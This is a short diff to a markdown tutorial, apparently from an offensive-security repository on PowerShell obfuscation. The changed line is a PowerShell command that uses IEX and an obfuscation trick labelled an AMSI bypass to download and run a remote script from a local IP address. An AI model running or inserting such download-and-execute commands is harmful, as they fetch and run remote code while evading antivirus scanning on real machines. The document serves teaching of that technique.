@@ -752,9 +752,9 @@ Here we can view the all process of encoding/decoding in powershell console
 
 <br />
 
-       powershell "IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
+       powershell IEX ('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
 
-![enigma0x3 - AMSI Bypass](http://i.)
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/DRUo9T.png)
 
 [0] [Glosario (Index)](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario-index)<br />
 
